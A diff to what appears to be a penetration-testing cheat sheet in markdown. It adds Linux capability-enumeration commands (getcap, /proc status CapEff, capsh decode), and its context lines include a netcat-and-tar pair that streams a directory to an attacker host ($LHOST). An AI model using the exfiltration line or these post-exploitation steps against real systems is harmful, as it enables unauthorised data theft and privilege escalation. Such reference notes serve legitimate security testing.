@@ -102,9 +102,22 @@ nc -lvnp 1337 | tar -xf -
 tar -cf - . | nc $LHOST 1337
 ```
 
-## get capabilities of all files recursively
+## capabilities
+
+### get capabilities of all files recursively
 ```bash
 getcap -r / 2>/dev/null
+```
+
+### without getcap binary
+```bash
+cat /proc/self/status | grep Cap
+cat /proc/$pid/status | grep CapEff
+```
+
+#### decode on host machine with capsh
+```bash
+capsh --decode=000001ffffffffff
 ```
 
 ## list systemd timers
